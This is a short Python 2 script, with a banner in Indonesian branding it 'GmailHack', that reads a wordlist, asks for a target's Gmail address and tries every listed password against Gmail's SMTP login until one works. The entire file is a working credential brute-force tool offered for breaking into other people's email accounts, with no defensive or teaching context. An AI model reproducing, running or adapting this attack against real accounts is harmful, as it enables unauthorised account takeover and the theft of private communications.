#!/usr/bin/python
# Made By Mr.F47                                      #
######################################################
print ("###############################################################################")
print ("#                                                                                                                                                                                  #")
print ("#                       create by B4J1N64N T3RH0RM4T                          #")
print ("#    								                                                                                                                                             #")
print ("#                              Ini GmailHack                                  #")
print ("#                                                                                                                                                                                  #")
print ("#                                                                                                                                                                                  #")
print ("#                      httpsthub.com/BajinganCyberArmy                        #")
print ("#                                                      		                                                                                                                   #")
print ("###############################################################################")
#######################################################################################################

import smtplib
       
######################################################################################################

file_path = raw_input('Masukin List Password Punya Lu  :')
passwfile = open(file_path,'r')
pass_lst = passwfile.readlines()

def login():
    i = 0
    usr = raw_input('What is the targets email address :')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for passw in pass_lst:
      i = i + 1
      print str(i) + '/' + str(len(pass_lst))
      try:
         server.login(usr, passw)
         print '[+] Password Found: %s ' % passw
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            print '[+] Password Found: %s ' % passw
            break
         else:
            print '[!] Password Incorrect: %s ' % passw
login()
